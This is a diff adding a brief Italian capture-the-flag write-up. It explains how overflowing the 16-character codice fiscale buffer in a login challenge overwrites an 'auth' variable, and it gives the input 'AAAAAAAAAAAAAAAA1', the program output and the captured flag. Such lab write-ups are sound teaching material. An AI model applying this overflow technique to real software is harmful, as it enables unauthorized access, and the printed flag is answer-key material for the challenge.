@@ -1,0 +1,14 @@
+la vulnerabilità di questa challenge è un overflow sulle scanf di user psw e cf in questo modo se nell'input di codice fiscale andremo a rempire tutto il buffer di 16 caratteri e successivamente inseriremo un valore diverso da 0 andremo a sovrascrivere auth e avremo la nostra flag.
+input da mandare AAAAAAAAAAAAAAAA1
+output ottenuto : 
+--------LOGIN--------
+inserisci il tuo username
+a
+inserisci la tua password
+a
+inserisci il tuo codice fiscale
+AAAAAAAAAAAAAAAA1
+GOOD JOB
+havceCTF{did_u_enjoy_th3_overlow?}
+
+
